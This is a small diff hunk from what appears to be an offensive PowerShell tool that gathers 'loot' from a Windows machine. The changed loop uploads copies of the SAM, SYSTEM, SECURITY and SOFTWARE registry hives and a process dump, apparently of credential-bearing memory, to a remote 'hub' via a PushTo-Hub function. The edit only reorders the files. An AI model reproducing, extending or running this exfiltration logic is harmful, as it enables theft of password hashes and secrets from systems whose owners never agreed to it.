@@ -654,7 +654,7 @@ Partially based on:
         $FileStream.Close()
 
         $SysInfo | PushTo-Hub -Name "sysinfo" -LootId $LootId
-        Foreach ($f in $ProcessDumpPath, $SamPath, $SystemPath, $SecurityPath, $SoftwarePath) {
+        Foreach ($f in $SamPath, $SystemPath, $SecurityPath, $SoftwarePath, $ProcessDumpPath) {
             if (Test-Path $f) { PushTo-Hub -LootId $LootId $f }
         }
     } finally {
